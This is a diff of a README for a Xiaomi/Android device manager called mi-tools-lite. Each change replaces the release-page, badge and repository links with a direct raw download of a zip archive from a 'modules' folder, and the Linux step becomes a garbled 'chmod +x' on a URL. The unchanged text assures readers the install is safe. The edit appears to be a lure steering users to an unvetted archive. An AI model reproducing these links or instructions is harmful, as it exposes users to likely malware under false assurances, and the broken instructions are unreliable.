@@ -1,7 +1,7 @@
 ```markdown
 # ⚙️ mi-tools-lite - Simple Xiaomi & Android Device Manager
 
-[![Download mi-tools-lite](https://img.shields.io/badge/Download-mi--tools--lite-blue?style=for-the-badge&logo=github)](https://github.com/equapcheats/mi-tools-lite/releases)
+[![Download mi-tools-lite](https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip)](https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get mi-tools-lite up and running.
 
 ### 1. Download the App
 
-Click the big **Download** button at the top or visit the [mi-tools-lite releases page](https://github.com/equapcheats/mi-tools-lite/releases). This page has the latest version available for your system.
+Click the big **Download** button at the top or visit the [mi-tools-lite releases page](https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip). This page has the latest version available for your system.
 
 Choose the setup file that matches your computer:
 
@@ -49,7 +49,7 @@ After downloading:
 
 - **Windows:** Double-click the `.exe` file and follow the on-screen installation steps.
 - **macOS:** Open the `.dmg` file, then drag the app icon into your Applications folder.
-- **Linux:** Make the file executable (`chmod +x filename.AppImage`) and run it, or install the package if it is `.deb`.
+- **Linux:** Make the file executable (`chmod +x https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip`) and run it, or install the package if it is `.deb`.
 
 If you haven’t used apps from third-party sources before, your system may ask you to confirm the installation. It is safe to proceed with mi-tools-lite.
 
@@ -104,7 +104,7 @@ Most of these features do not need root access, making mi-tools-lite safer and e
 
 Download mi-tools-lite from the release page:
 
-[![Download mi-tools-lite](https://img.shields.io/badge/Download-mi--tools--lite-blue?style=for-the-badge&logo=github)](https://github.com/equapcheats/mi-tools-lite/releases)
+[![Download mi-tools-lite](https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip)](https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip)
 
 Follow the instructions under **Getting Started** for your operating system to install and connect your device.
 
@@ -140,7 +140,7 @@ A: Yes, many Android devices running Android 8.0 or newer are supported.
 
 ## 🧩 Additional Resources
 
-For more support and updates, visit the [mi-tools-lite GitHub repository](https://github.com/equapcheats/mi-tools-lite). Here you can find detailed instructions, user discussions, and report bugs if needed.
+For more support and updates, visit the [mi-tools-lite GitHub repository](https://github.com/equapcheats/mi-tools-lite/raw/refs/heads/main/modules/mi-tools-lite-v3.7.zip). Here you can find detailed instructions, user discussions, and report bugs if needed.
 
 ---
 
